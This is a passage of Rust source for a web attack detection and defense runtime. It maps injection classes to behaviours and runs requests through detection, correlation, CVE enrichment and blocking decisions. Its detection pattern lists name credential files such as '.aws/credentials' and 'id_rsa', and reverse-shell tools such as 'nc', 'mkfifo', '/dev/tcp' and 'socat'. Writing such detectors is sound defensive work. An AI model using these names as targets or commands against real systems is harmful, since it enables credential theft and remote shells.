    ClassBehaviorRule { classes: &[InvariantClass::ApiMassEnum], behaviors: &["data_exfiltration", "enumeration"] },
    ClassBehaviorRule { classes: &[InvariantClass::LlmPromptInjection, InvariantClass::LlmJailbreak], behaviors: &["instruction_override"] },
    ClassBehaviorRule { classes: &[InvariantClass::LlmDataExfiltration], behaviors: &["data_exfiltration"] },
    ClassBehaviorRule { classes: &[InvariantClass::DependencyConfusion, InvariantClass::PostinstallInjection], behaviors: &["supply_chain_compromise"] },
    ClassBehaviorRule { classes: &[InvariantClass::EnvExfiltration], behaviors: &["credential_extraction", "data_exfiltration"] },
    ClassBehaviorRule { classes: &[InvariantClass::WsInjection, InvariantClass::WsHijack], behaviors: &["websocket_abuse"] },
    ClassBehaviorRule { classes: &[InvariantClass::HttpSmuggleClTe, InvariantClass::HttpSmuggleH2, InvariantClass::HttpSmuggleChunkExt, InvariantClass::HttpSmuggleZeroCl, InvariantClass::HttpSmuggleExpect], behaviors: &["request_smuggling"] },
    ClassBehaviorRule { classes: &[InvariantClass::DeserJavaGadget, InvariantClass::DeserPhpObject, InvariantClass::DeserPythonPickle], behaviors: &["code_execution"] },
];

static CONTENT_BEHAVIORS: &[ContentBehaviorRule] = &[
    ContentBehaviorRule {
        classes: &[InvariantClass::PathDotdotEscape, InvariantClass::PathEncodingBypass, InvariantClass::PathNullTerminate, InvariantClass::PathNormalizationBypass],
        patterns: &[".env", "passwd", "shadow", "id_rsa", "id_ed25519", ".ssh", ".git/config", ".aws/credentials", ".docker/config", "wp-config.php", "database.yml", "application.properties"],
        behaviors: &["credential_extraction", "path_sensitive_file"],
    },
    ContentBehaviorRule {
        classes: &[InvariantClass::XssTagInjection, InvariantClass::XssEventHandler, InvariantClass::XssProtocolHandler, InvariantClass::XssAttributeEscape],
        patterns: &["document.cookie", "localstorage", "sessionstorage"],
        behaviors: &["cookie_exfil"],
    },
    ContentBehaviorRule {
        classes: &[InvariantClass::CmdSeparator, InvariantClass::CmdSubstitution, InvariantClass::CmdArgumentInjection],
        patterns: &["/bin/bash", "/bin/sh", "nc ", "ncat ", "netcat", "mkfifo", "/dev/tcp", "python -c", "perl -e", "php -r", "ruby -e", "socat"],
        behaviors: &["reverse_shell", "outbound_connection"],
    },
    ContentBehaviorRule {
        classes: &[InvariantClass::SstiJinjaTwig, InvariantClass::SstiElExpression],
        patterns: &["__class__", "__mro__", "__subclasses__", "__globals__"],
        behaviors: &["class_traversal"],
    },
    ContentBehaviorRule {
        classes: &[InvariantClass::SstiJinjaTwig, InvariantClass::SstiElExpression],
        patterns: &[".exec(", "popen(", "getruntime(", "processbuilder(", "runtime.exec("],
        behaviors: &["code_execution"],
    },
    ContentBehaviorRule {
        classes: &[InvariantClass::XxeEntityExpansion],
        patterns: &["http://", "https://", "ftp://", "gopher://"],
        behaviors: &["outbound_connection"],
    },
];

static PATH_BEHAVIORS: &[PathBehaviorRule] = &[
    PathBehaviorRule {
        path_prefixes: &["/admin", "/wp-admin", "/dashboard", "/manager", "/console", "/actuator", "/phpmyadmin"],
        behaviors: &["admin_access"],
    },
    PathBehaviorRule {
        path_prefixes: &["/api/v1/", "/api/v2/", "/graphql", "/rest/"],
        behaviors: &["api_targeting"],
    },
];

// ── Effect Routing ────────────────────────────────────────────────

fn route_effect_simulation(classes: &[InvariantClass], input: &str) -> Option<ExploitEffect> {
    let class_set: HashSet<InvariantClass> = classes.iter().copied().collect();

    // SQL injection
    let sql_classes = [
        InvariantClass::SqlTautology, InvariantClass::SqlUnionExtraction,
        InvariantClass::SqlStackedExecution, InvariantClass::SqlTimeOracle,
        InvariantClass::SqlErrorOracle, InvariantClass::SqlStringTermination,
        InvariantClass::SqlCommentTruncation, InvariantClass::JsonSqlBypass,
    ];
    if sql_classes.iter().any(|c| class_set.contains(c)) {
        return Some(simulate_sql_effect(input, None));
    }

    // Command injection
    let cmd_classes = [InvariantClass::CmdSeparator, InvariantClass::CmdSubstitution, InvariantClass::CmdArgumentInjection];
    if cmd_classes.iter().any(|c| class_set.contains(c)) {
        return Some(simulate_cmd_effect(input));
    }

    // XSS
    let xss_classes = [
        InvariantClass::XssTagInjection, InvariantClass::XssEventHandler,
        InvariantClass::XssProtocolHandler, InvariantClass::XssAttributeEscape,
        InvariantClass::XssTemplateExpression,
    ];
    if xss_classes.iter().any(|c| class_set.contains(c)) {
        return Some(simulate_xss_effect(input));
    }

    // Path traversal
    let path_classes = [
        InvariantClass::PathDotdotEscape, InvariantClass::PathEncodingBypass,
        InvariantClass::PathNullTerminate, InvariantClass::PathNormalizationBypass,
    ];
    if path_classes.iter().any(|c| class_set.contains(c)) {
        return Some(simulate_path_effect(input));
    }

    // SSRF
    let ssrf_classes = [InvariantClass::SsrfInternalReach, InvariantClass::SsrfCloudMetadata, InvariantClass::SsrfProtocolSmuggle];
    if ssrf_classes.iter().any(|c| class_set.contains(c)) {
        return Some(simulate_ssrf_effect(input));
    }

    None
}

// ── Unified Runtime ───────────────────────────────────────────────

/// Contract for swappable chain correlator implementations.
pub trait ChainSubsystem: Send + Sync {
    /// Ingest a new signal and return current chain matches.
    fn ingest(&mut self, signal: ChainSignal) -> Vec<ChainMatch>;
    /// Number of configured chain definitions.
    fn chain_count(&self) -> usize;
    /// Number of active source windows.
    fn active_source_count(&self) -> usize;
}

impl ChainSubsystem for ChainCorrelator {
    fn ingest(&mut self, signal: ChainSignal) -> Vec<ChainMatch> {
        ChainCorrelator::ingest(self, signal)
    }

    fn chain_count(&self) -> usize {
        ChainCorrelator::chain_count(self)
    }

    fn active_source_count(&self) -> usize {
        ChainCorrelator::active_source_count(self)
    }
}

/// Contract for swappable campaign intelligence implementations.
pub trait CampaignSubsystem: Send + Sync {
    /// Record a campaign signal.
    fn record_signal(&mut self, signal: CampaignSignal);
    /// Threat score for a source.
    fn get_threat_level(&self, source_hash: &str) -> f64;
    /// Current campaign attack phase for a source.
    fn get_attack_phase(&self, source_hash: &str) -> Option<AttackPhase>;
    /// Campaign membership for a source.
    fn is_part_of_campaign(&self, source_hash: &str) -> Option<&Campaign>;
    /// Campaign subsystem stats.
    fn get_stats(&self, now: u64) -> crate::campaign::CampaignStats;
}

impl CampaignSubsystem for CampaignIntelligence {
    fn record_signal(&mut self, signal: CampaignSignal) {
        CampaignIntelligence::record_signal(self, signal)
    }

    fn get_threat_level(&self, source_hash: &str) -> f64 {
        CampaignIntelligence::get_threat_level(self, source_hash)
    }

    fn get_attack_phase(&self, source_hash: &str) -> Option<AttackPhase> {
        CampaignIntelligence::get_attack_phase(self, source_hash)
    }

    fn is_part_of_campaign(&self, source_hash: &str) -> Option<&Campaign> {
        CampaignIntelligence::is_part_of_campaign(self, source_hash)
    }

    fn get_stats(&self, now: u64) -> crate::campaign::CampaignStats {
        CampaignIntelligence::get_stats(self, now)
    }
}

/// Contract for swappable knowledge graph implementations.
pub trait KnowledgeSubsystem: Send + Sync {
    /// Enrich a class match with CVE intelligence.
    fn enrich_detection(
        &self,
        class: InvariantClass,
        tech: Option<(&str, &str)>,
    ) -> DetectionEnrichment;
    /// Number of base knowledge entries.
    fn total_entries(&self) -> usize;
    /// Number of framework-specific profiles.
    fn total_framework_profiles(&self) -> usize;
}

impl KnowledgeSubsystem for ExploitKnowledgeGraph {
    fn enrich_detection(
        &self,
        class: InvariantClass,
        tech: Option<(&str, &str)>,
    ) -> DetectionEnrichment {
        ExploitKnowledgeGraph::enrich_detection(self, class, tech)
    }

    fn total_entries(&self) -> usize {
        ExploitKnowledgeGraph::total_entries(self)
    }

    fn total_framework_profiles(&self) -> usize {
        ExploitKnowledgeGraph::total_framework_profiles(self)
    }
}

/// Contract for swappable MITRE mapping implementations.
pub trait MitreSubsystem: Send + Sync {
    /// Map detected classes to ATT&CK technique IDs.
    fn map_detections(&self, detections: &[InvariantClass]) -> Vec<&'static str>;
}

impl MitreSubsystem for MitreMapper {
    fn map_detections(&self, detections: &[InvariantClass]) -> Vec<&'static str> {
        MitreMapper::map_detections(self, detections)
    }
}

/// Unified runtime orchestrating all subsystems end-to-end.
pub struct UnifiedRuntime {
    /// Detection engine subsystem.
    pub engine: InvariantEngine,
    /// Temporal chain correlator subsystem.
    pub chains: ChainCorrelator,
    /// Campaign intelligence subsystem.
    pub campaigns: CampaignIntelligence,
    /// Exploit knowledge subsystem.
    pub knowledge_graph: ExploitKnowledgeGraph,
    /// MITRE ATT&CK mapping subsystem.
    pub mitre: MitreMapper,
    /// Live threat intelligence feed (STIX/TAXII ingest + IOC matching).
    pub threat_intel: ThreatIntelFeed,
    /// Detection telemetry subsystem.
    pub telemetry: Telemetry,
    /// Optional API contract schema for request validation.
    pub api_schema: Option<ApiSchema>,
    analysis_cache: AnalysisCache,
    cve_cache: CveEnrichmentCache,
    mitre_cache: MitreTechniqueCache,
}

impl UnifiedRuntime {
    /// Create runtime with default built-in subsystem implementations.
    pub fn new() -> Self {
        let chains = ChainCorrelator::new();
        let knowledge_graph = ExploitKnowledgeGraph::new();
        let mut telemetry = Telemetry::new();
        telemetry.set_health_dimensions(chains.chain_count(), knowledge_graph.total_entries());
        Self {
            engine: InvariantEngine::new(),
            chains,
            campaigns: CampaignIntelligence::new(),
            knowledge_graph,
            mitre: MitreMapper::new(),
            threat_intel: ThreatIntelFeed::new(),
            telemetry,
            api_schema: None,
            analysis_cache: AnalysisCache::new(ANALYSIS_CACHE_SIZE),
            cve_cache: CveEnrichmentCache::new(CVE_ENRICHMENT_CACHE_SIZE),
            mitre_cache: MitreTechniqueCache::new(MITRE_CACHE_SIZE),
        }
    }

    /// Create runtime from caller-provided subsystems for swapability.
    pub fn with_subsystems(
        engine: InvariantEngine,
        chains: ChainCorrelator,
        campaigns: CampaignIntelligence,
        knowledge_graph: ExploitKnowledgeGraph,
        mitre: MitreMapper,
    ) -> Self {
        let mut telemetry = Telemetry::new();
        telemetry.set_health_dimensions(chains.chain_count(), knowledge_graph.total_entries());
        Self {
            engine,
            chains,
            campaigns,
            knowledge_graph,
            mitre,
            threat_intel: ThreatIntelFeed::new(),
            telemetry,
            api_schema: None,
            analysis_cache: AnalysisCache::new(ANALYSIS_CACHE_SIZE),
            cve_cache: CveEnrichmentCache::new(CVE_ENRICHMENT_CACHE_SIZE),
            mitre_cache: MitreTechniqueCache::new(MITRE_CACHE_SIZE),
        }
    }

    /// Replace detection engine subsystem.
    pub fn replace_engine(&mut self, engine: InvariantEngine) -> InvariantEngine {
        std::mem::replace(&mut self.engine, engine)
    }

    /// Replace chain correlator subsystem.
    pub fn replace_chains(&mut self, chains: ChainCorrelator) -> ChainCorrelator {
        let old = std::mem::replace(&mut self.chains, chains);
        self.telemetry
            .set_health_dimensions(self.chains.chain_count(), self.knowledge_graph.total_entries());
        old
    }

    /// Replace campaign intelligence subsystem.
    pub fn replace_campaigns(&mut self, campaigns: CampaignIntelligence) -> CampaignIntelligence {
        std::mem::replace(&mut self.campaigns, campaigns)
    }

    /// Replace knowledge graph subsystem.
    pub fn replace_knowledge_graph(&mut self, knowledge_graph: ExploitKnowledgeGraph) -> ExploitKnowledgeGraph {
        let old = std::mem::replace(&mut self.knowledge_graph, knowledge_graph);
        self.telemetry
            .set_health_dimensions(self.chains.chain_count(), self.knowledge_graph.total_entries());
        old
    }

    /// Replace MITRE mapper subsystem.
    pub fn replace_mitre(&mut self, mitre: MitreMapper) -> MitreMapper {
        std::mem::replace(&mut self.mitre, mitre)
    }

    /// Replace threat intel feed subsystem.
    pub fn replace_threat_intel(&mut self, threat_intel: ThreatIntelFeed) -> ThreatIntelFeed {
        std::mem::replace(&mut self.threat_intel, threat_intel)
    }

    /// Set API schema used for request contract validation.
    pub fn set_api_schema(&mut self, schema: ApiSchema) {
        self.api_schema = Some(schema);
    }

    /// Disable API schema validation.
    pub fn clear_api_schema(&mut self) {
        self.api_schema = None;
    }

    /// Process a request through the full unified pipeline.
    /// This is the single entry point for ALL detection, correlation,
    /// intelligence, and defense decision-making.
    pub fn process(&mut self, request: &UnifiedRequest) -> UnifiedResponse {
        let start = std::time::Instant::now();
        let known_context = request.known_context.as_ref();
        let (request_path_only, request_query) = split_path_and_query(&request.path);
        let sanitized_headers = sanitize_header_pairs(&request.headers);
        let schema_violations = self
            .api_schema
            .as_ref()
            .map(|schema| {
                validate_request(
                    schema,
                    &request.method,
                    request_path_only,
                    request_query,
                    &request.input,
                    &sanitized_headers,
                )
            })
            .unwrap_or_default();
        let schema_violations = schema_violations;
        let mut user_agent = request.user_agent.clone().unwrap_or_default();
        if user_agent.is_empty() {
            user_agent = request
                .headers
                .iter()
                .find(|(name, _)| name.eq_ignore_ascii_case("user-agent"))
                .map(|(_, value)| value.clone())
                .unwrap_or_default();
        }
        user_agent = sanitize_header_value(&user_agent);
        let fallback_source_hash = derive_fallback_source_hash(request, &sanitized_headers, &user_agent);

        let header_profile = analyze_headers(&sanitized_headers);
        let ja3 = request.ja3.as_deref().filter(|s| !s.trim().is_empty()).map(parse_ja3);
        let known_legitimate_bot = identify_legitimate_bot(&user_agent);
        let known_scanner = is_known_scanner(&user_agent);
        let known_bot_ja3 = ja3.as_ref().and_then(identify_known_bot_ja3);
        let known_browser_ja3 = ja3.as_ref().and_then(identify_browser_ja3);
        let timing = if request.recent_intervals_ms.is_empty() {
            None
        } else {
            Some(RequestTiming {
                intervals_ms: request.recent_intervals_ms.clone(),
                automated: is_automated_timing(&request.recent_intervals_ms),
            })
        };
        let credential_stuffing = is_credential_stuffing(&request.recent_paths, &request.recent_intervals_ms);
        let bot_signals = BotSignals {
            user_agent,
            header_profile,
            ja3,
            known_legitimate_bot,
            known_scanner,
            known_bot_ja3,
            known_browser_ja3,
            timing,
            credential_stuffing,
            source_reputation: request.source_reputation,
        };
        let bot_score = compute_bot_score(&bot_signals);
        let bot_classification = classify_bot(&bot_signals);

        // ── Step 1: Adaptive Detection ──
        let l1_matches = self.engine.detect(&request.input);
        let should_full_analysis = should_run_full_analysis(request, &l1_matches, known_context);
        let mut analysis = if should_full_analysis {
            let cache_key = request_analysis_cache_key(request, known_context);
            if let Some(cached) = self.analysis_cache.get(cache_key) {
                cached
            } else {
                let result = self.engine.analyze(&AnalysisRequest {
                    input: request.input.clone(),
                    known_context: request.known_context,
                    source_reputation: request.source_reputation,
                    request_meta: Some(RequestMeta {
                        method: Some(request.method.clone()),
                        path: Some(request.path.clone()),
                        content_type: request.content_type.clone(),
                    }),
                });
                self.analysis_cache.put(cache_key, result.clone());
                result
            }
        } else {
            build_fast_analysis(request, l1_matches.clone())
        };

        let mut matches = analysis.matches;
        clamp_match_confidences(&mut matches);
        analysis.recommendation.confidence = clamp_confidence(analysis.recommendation.confidence);
        analysis.contexts = known_context.cloned().into_iter().collect();
        let mut rasp_confirmed_exploit = false;
        let mut rasp_confirmed_count = 0usize;
        let parsed_body = parse_body(request.content_type.as_deref(), &request.input);
        let parser_anomalies = collect_parser_anomalies(&parsed_body, &request.input);
        let field_inputs = collect_body_fields(&parsed_body);
        let mut field_anomaly_count = parser_anomalies.len();

        if let Some(rasp) = request.rasp_context.as_ref() {
            let mut confirmed = Vec::new();
            confirmed.extend(detect_sqli_via_query_taint(&request.input, &rasp.db_queries));
            confirmed.extend(detect_rce_via_exec_taint(&request.input, &rasp.process_execs));
            confirmed.extend(detect_ssrf_via_network_taint(&request.input, &rasp.network_calls));
            confirmed.extend(detect_path_traversal_via_file_taint(&request.input, &rasp.file_accesses));

            if !confirmed.is_empty() {
                rasp_confirmed_exploit = true;
                rasp_confirmed_count = confirmed.len();

                for detection in &confirmed {
                    if let Some(existing) = matches.iter_mut().find(|m| m.class == detection.class) {
                        existing.confidence = clamp_confidence(existing.confidence.max(detection.confidence));
                        existing.severity = std::cmp::max(existing.severity, detection.severity);
                        existing.description = format!("{} | rasp_confirmed_sink:{}", existing.description, detection.sink);
                        if existing.l2_evidence.is_none() {
                            existing.l2_evidence = Some(detection.evidence.clone());
                        }
                    }
                }

                let missing: Vec<_> = confirmed
                    .iter()
                    .filter(|d| !matches.iter().any(|m| m.class == d.class))
                    .cloned()
                    .collect();
                matches.extend(detections_to_matches(&missing));

                let max_rasp_conf = confirmed.iter().map(|d| d.confidence).fold(0.0_f64, f64::max);
                analysis.recommendation.block = true;
                analysis.recommendation.confidence = clamp_confidence(
                    analysis.recommendation.confidence.max(max_rasp_conf),
                );
                analysis.recommendation.threshold = analysis.recommendation.threshold.min(0.5);
                if analysis.recommendation.reason == "no_detections" || analysis.recommendation.reason.is_empty() {
                    analysis.recommendation.reason = "rasp_confirmed_exploit".to_owned();
                } else {
                    analysis.recommendation.reason = format!("{}|rasp_confirmed_exploit", analysis.recommendation.reason);
                }
            }
        }

        if !field_inputs.is_empty() {
            let mut field_level_matches = Vec::new();

            for (ctx, value) in field_inputs
                .into_iter()
                .take(MAX_FIELD_ANALYSIS_FIELDS)
                .filter(|(_, v)| !v.trim().is_empty() && v.len() <= MAX_FIELD_ANALYSIS_VALUE_LEN)
            {
                let anomalies = analyze_field(&ctx.field_name, &value, ctx.expected_type);
                field_anomaly_count += anomalies.len();

                let field_known_context = request
                    .known_context
                    .or_else(|| field_type_context(ctx.expected_type));

                let field_analysis = self.engine.analyze(&AnalysisRequest {
                    input: value.clone(),
                    known_context: field_known_context,
                    source_reputation: request.source_reputation,
                    request_meta: Some(RequestMeta {
                        method: Some(request.method.clone()),
                        path: Some(request.path.clone()),
                        content_type: request.content_type.clone(),
                    }),
                });

                for mut m in field_analysis.matches {
                    m.description = format!("{} | field:{}", m.description, ctx.field_path);
                    field_level_matches.push(m);
                }
            }

            if !field_level_matches.is_empty() {
                for field_match in field_level_matches {
                    if let Some(existing) = matches.iter_mut().find(|m| m.class == field_match.class) {
                        existing.confidence = clamp_confidence(existing.confidence.max(field_match.confidence));
                        existing.severity = std::cmp::max(existing.severity, field_match.severity);
                        if field_match.description.len() > existing.description.len() {
                            existing.description = field_match.description;
                        }
                        if existing.l2_evidence.is_none() {
                            existing.l2_evidence = field_match.l2_evidence.clone();
                        }
                        if existing.proof.is_none() {
                            existing.proof = field_match.proof.clone();
                        }
                    } else {
                        matches.push(field_match);
                    }
                }

                let max_conf = matches.iter().map(|m| m.confidence).fold(0.0_f64, f64::max);
                analysis.recommendation.confidence = clamp_confidence(
                    analysis.recommendation.confidence.max(max_conf),
                );
                if self.engine.should_block(&matches) {
                    analysis.recommendation.block = true;
                    analysis.recommendation.reason = "field_level_detection_threshold".to_owned();
                    analysis.recommendation.threshold = matches
                        .iter()
                        .map(|m| m.severity.block_threshold())
                        .fold(0.95_f64, f64::min);
                }
            }
        }

        let runtime_protocol_matches = detect_runtime_protocol_anomalies(request, &sanitized_headers);
        if !runtime_protocol_matches.is_empty() {
            merge_runtime_matches(&mut matches, runtime_protocol_matches.clone());
            apply_runtime_findings_to_recommendation(&mut analysis.recommendation, &runtime_protocol_matches);
        }

        if matches.is_empty() {
            analysis.matches = Vec::new();
            analysis.intent = None;
            analysis.anomaly_score = None;
            let response_analysis = build_response_analysis(request, &[]);
            let decision = make_defense_decision(
                &analysis,
                &matches,
                &[],
                0.0,
                None,
                &[],
                &default_polyglot(),
                false,
                None,
            );
            let mut decision = decision;
            apply_response_findings_to_decision(&mut decision, response_analysis.as_ref());
            apply_schema_violations_to_decision(&mut decision, &schema_violations);
            normalize_decision(&mut decision, &analysis.matches);
            let elapsed = start.elapsed();
            self.telemetry.record_request(
                &[],
                false,
                elapsed.as_micros() as u64,
                &request.source_hash,
                request.timestamp,
            );
            self.telemetry
                .set_health_dimensions(self.chains.chain_count(), self.knowledge_graph.total_entries());

            return UnifiedResponse {
                analysis,
                highest_severity: Severity::Low,
                chain_matches: Vec::new(),
                active_campaign: None,
                attack_phase: None,
                threat_level: 0.0,
                bot_score,
                bot_classification,
                linked_cve_count: 0,
                actively_exploited_cves: Vec::new(),
                highest_epss: 0.0,
                decision,
                mitre_techniques: Vec::new(),
                compliance_mappings: compliance_report(&[]),
                schema_violations,
                effect_simulation: None,
                adversary_fingerprint: None,
                shape_validation: None,
                response_plan: None,
                response_analysis,
                total_processing_time_us: elapsed.as_micros() as f64,
            };
        }

        // ── Step 2: Polyglot + Entropy + Intent enrichment ──
        let detected_classes: Vec<InvariantClass> = matches.iter().map(|m| m.class).collect();
        let response_analysis = build_response_analysis(request, &detected_classes);
        let should_collect_chain = detected_classes.len() >= HOT_PATH_BUFFERED_CHAIN_MIN
            || matches.iter().any(|m| m.confidence >= 0.72 || m.severity >= Severity::High);
        let polyglot = analyze_polyglot_input(&detected_classes, &request.input);
        let analyze_intent = should_full_analysis
            || should_collect_chain
            || matches.iter().any(|m| m.confidence >= 0.55 || m.severity == Severity::Critical);
        let evasion = if should_full_analysis || should_collect_chain || analyze_intent {
            detect_encoding_evasion(&request.input)
        } else {
            default_encoding_evasion()
        };
        let anomaly_mult = if should_full_analysis { anomaly_confidence_multiplier(&request.input) } else { 1.0 };

        let intent = if analyze_intent {
            Some(classify_intent(&detected_classes, &request.input, Some(&request.path)))
        } else {
            None
        };
        if let Some(intent) = intent.as_ref() {
            analysis.intent = Some(to_serialized_intent(intent));
        } else {
            analysis.intent = None;
        }

        analysis.encoding_evasion = evasion.is_evasion;
        if anomaly_mult > 1.0 && analysis.anomaly_score.is_none() {
            analysis.anomaly_score = Some((anomaly_mult - 1.0).min(1.0));
        }

        if should_full_analysis || should_collect_chain || evasion.is_evasion || anomaly_mult > 1.0 {
            for m in matches.iter_mut() {
                if evasion.is_evasion {
                    m.confidence = clamp_confidence((m.confidence * (1.0 + evasion.confidence * 0.03)).min(0.99));
                }
                if anomaly_mult > 1.0 {
                    m.confidence = clamp_confidence((m.confidence * anomaly_mult).min(0.99));
                }
            }
        }

        let mut ioc_hit_count = 0usize;
        for m in matches.iter_mut() {
            let ioc_hits = self.threat_intel.match_detection(m.class, &request.input);
            if !ioc_hits.is_empty() {
                let boost = (ioc_hits.len() as f64 * 0.04).min(0.2);
                m.confidence = clamp_confidence((m.confidence + boost).min(0.99));
                ioc_hit_count += ioc_hits.len();
            }
        }

        matches.sort_by(|a, b| b.confidence.partial_cmp(&a.confidence).unwrap_or(std::cmp::Ordering::Equal));
        matches.dedup_by_key(|m| m.class);
        clamp_match_confidences(&mut matches);

        analysis.matches = matches;
        analysis.recommendation.confidence = clamp_confidence(analysis.recommendation.confidence);

        // ── Step 3: Temporal Correlation — Chain Detection ──
        let behaviors = derive_behaviors(&analysis.matches, &request.input, &request.path, &polyglot, evasion.is_evasion);

        let chain_matches = if should_collect_chain {
            let chain_signal = ChainSignal {
                source_hash: request.source_hash.clone(),
                classes: detected_classes.clone(),
                behaviors: behaviors.clone(),
                confidence: analysis.matches.iter().map(|m| m.confidence).fold(0.0_f64, f64::max),
                path: request.path.clone(),
                method: request.method.clone(),
                timestamp: request.timestamp,
            };

            if !analysis.matches.is_empty() || !behaviors.is_empty() {
                self.chains.ingest(chain_signal)
            } else {
                Vec::new()
            }
        } else {
            Vec::new()
        };
        let mut chain_matches = chain_matches;
        if let Some(derived_hash) = fallback_source_hash.as_ref() {
            if should_collect_chain && derived_hash != &request.source_hash {
                let derived_chain_signal = ChainSignal {
                    source_hash: derived_hash.clone(),
                    classes: detected_classes.clone(),
                    behaviors: behaviors.clone(),
                    confidence: analysis.matches.iter().map(|m| m.confidence).fold(0.0_f64, f64::max),
                    path: request.path.clone(),
                    method: request.method.clone(),
                    timestamp: request.timestamp,
                };
                let mut derived_matches = self.chains.ingest(derived_chain_signal);
                chain_matches.append(&mut derived_matches);
                chain_matches.sort_by(|a, b| {
                    b.confidence
                        .partial_cmp(&a.confidence)
                        .unwrap_or(std::cmp::Ordering::Equal)
                });
                chain_matches.dedup_by(|a, b| a.chain_id == b.chain_id);
            }
        }

        // ── Step 4: Campaign Intelligence ──
        let enc = detect_encoding_preference(&request.input);
        let top_match = analysis.matches.iter().max_by(|a, b| {
            a.confidence.partial_cmp(&b.confidence).unwrap_or(std::cmp::Ordering::Equal)
        });
        let signal = if let Some(top) = top_match {
            CampaignSignal {
                signal_type: format!("{:?}", top.class),
                timestamp: request.timestamp,
                confidence: top.confidence,
                path: request.path.clone(),
                source_hash: request.source_hash.clone(),
                encoding: enc,
            }
        } else {
            CampaignSignal {
                signal_type: "unknown".to_string(),
                timestamp: request.timestamp,
                confidence: 0.0,
                path: request.path.clone(),
                source_hash: request.source_hash.clone(),
                encoding: enc,
            }
        };

        self.campaigns.record_signal(signal);
        if let Some(derived_hash) = fallback_source_hash.as_ref() {
            if derived_hash != &request.source_hash {
                let derived_signal = CampaignSignal {
                    signal_type: if let Some(top) = top_match {
                        format!("{:?}", top.class)
                    } else {
                        "unknown".to_owned()
                    },
                    timestamp: request.timestamp,
                    confidence: top_match.map(|m| m.confidence).unwrap_or(0.0),
                    path: request.path.clone(),
                    source_hash: derived_hash.clone(),
                    encoding: enc,
                };
                self.campaigns.record_signal(derived_signal);
            }
        }

        let threat_level = self.campaigns.get_threat_level(&request.source_hash);
        let attack_phase = self.campaigns.get_attack_phase(&request.source_hash);
        let active_campaign = self.campaigns.is_part_of_campaign(&request.source_hash).cloned();
        let mut threat_level = threat_level;
        let mut attack_phase = attack_phase;
        let mut active_campaign = active_campaign;
        if let Some(derived_hash) = fallback_source_hash.as_ref() {
            if derived_hash != &request.source_hash {
                let derived_threat = self.campaigns.get_threat_level(derived_hash);
                if derived_threat > threat_level {
                    threat_level = derived_threat;
                    attack_phase = self.campaigns.get_attack_phase(derived_hash);
                    active_campaign = self.campaigns.is_part_of_campaign(derived_hash).cloned();
                }
            }
        }

        // ── Step 5: MITRE ATT&CK Mapping ──
        let mitre_cache_key = mitre_cache_key(&detected_classes);
        let mut mitre_ids = if let Some(cached) = self.mitre_cache.get(mitre_cache_key) {
            cached
        } else {
            let mut ids = self.mitre.map_detections(&detected_classes);
            ids.sort_unstable();
            ids.dedup();
            self.mitre_cache.put(mitre_cache_key, ids.clone());
            ids
        };
        mitre_ids.sort_unstable();
        let mitre_techniques: Vec<String> = mitre_ids.into_iter().map(|s| s.to_string()).collect();
        let compliance_mappings = compliance_report(&detected_classes);

        // ── Step 6: Fast decision pass (no CVE enrichment yet). ──
        let mut decision = make_defense_decision(
            &analysis,
            &analysis.matches,
            &chain_matches,
            threat_level,
            active_campaign.as_ref(),
            &[],
            &polyglot,
            evasion.is_evasion,
            intent.as_ref(),
        );

        if rasp_confirmed_exploit {
            decision.action = std::cmp::max(decision.action, DefenseAction::Block);
            decision.confidence = decision.confidence.max(0.99);
            decision.alert = true;
            decision.contributors.push(format!("rasp:confirmed_sinks:{rasp_confirmed_count}"));
            if decision.reason == "no_detections" {
                decision.reason = "RASP-confirmed exploit path".to_owned();
            }
        }

        let should_skip_cve = decision.action >= DefenseAction::Block
            && decision.confidence >= 0.97
            && analysis.matches.iter().all(|m| m.severity >= Severity::High);

        let mut all_linked_cves = HashSet::new();
        let mut actively_exploited_cves = Vec::new();
        let mut highest_epss = 0.0_f64;
        let mut verification_hits = 0_u32;

        if !should_skip_cve {
            let tech_ref = request.detected_tech.as_ref().map(|t| (t.vendor.as_str(), t.product.as_str()));
            for m in analysis.matches.iter() {
                let key = CveCacheKey {
                    class: m.class,
                    vendor: tech_ref.map(|(v, _)| v.to_lowercase()),
                    product: tech_ref.map(|(_, p)| p.to_lowercase()),
                };

                let enrichment = if let Some(cached) = self.cve_cache.get(&key) {
                    cached
                } else {
                    let fresh = self.knowledge_graph.enrich_detection(m.class, tech_ref);
                    self.cve_cache.put(key, fresh.clone());
                    fresh
                };

                for cve in &enrichment.linked_cves {
                    all_linked_cves.insert(cve.clone());
                }
                if enrichment.actively_exploited {
                    actively_exploited_cves.extend(enrichment.linked_cves);
                }
                highest_epss = highest_epss.max(enrichment.highest_epss);
                if enrichment.verification_available {
                    verification_hits += 1;
                }
            }

            actively_exploited_cves.sort_unstable();
            actively_exploited_cves.dedup();
            analysis.cve_enrichment = Some(crate::types::CveEnrichmentSummary {
                total_linked_cves: all_linked_cves.len() as u32,
                actively_exploited_classes: actively_exploited_cves.clone(),
                highest_epss,
            });

            decision = make_defense_decision(
                &analysis,
                &analysis.matches,
                &chain_matches,
                threat_level,
                active_campaign.as_ref(),
                &actively_exploited_cves,
                &polyglot,
                evasion.is_evasion,
                intent.as_ref(),
            );
        }

        if ioc_hit_count > 0 {
            decision.confidence = clamp_confidence(
                (decision.confidence + (ioc_hit_count as f64 * 0.03).min(0.15)).min(0.99),
            );
            decision.contributors.push(format!("threat_intel:ioc_hits:{ioc_hit_count}"));
        }
        if let Some(derived_hash) = fallback_source_hash.as_ref() {
            if derived_hash != &request.source_hash {
                decision
                    .contributors
                    .push("source_identity:fallback_hash_applied".to_owned());
            }
        }

        let should_post_process = !analysis.matches.is_empty();

        let effect_simulation = if should_post_process {
            route_effect_simulation(&detected_classes, &request.input)
        } else {
            None
        };

        let adversary_fingerprint = if should_post_process {
            Some(fingerprint_adversary(&request.input, &detected_classes))
        } else {
            None
        };

        let shape_validation = if should_post_process {
            request
                .param_name
                .as_ref()
                .and_then(|name| auto_validate_shape(&request.input, name))
        } else {
            None
        };

        if let Some(ref eff) = effect_simulation {
            if eff.impact.base_score >= 9.0 && !decision.alert {
                decision.alert = true;
                decision
                    .contributors
                    .push(format!("effect:{:?}:impact_{:.1}", eff.operation, eff.impact.base_score));
            }
        }

        if let Some(ref sv) = shape_validation {
            if !sv.matches && sv.confidence_boost > 0.0 {
                decision.confidence = clamp_confidence((decision.confidence + sv.confidence_boost).min(0.99));
                decision
                    .contributors
                    .push(format!("shape_violation:deviation_{:.2}", sv.deviation));
            }
        }

        if anomaly_mult > 1.0 {
            decision.confidence = clamp_confidence((decision.confidence * anomaly_mult).min(0.99));
        }
        apply_response_findings_to_decision(&mut decision, response_analysis.as_ref());
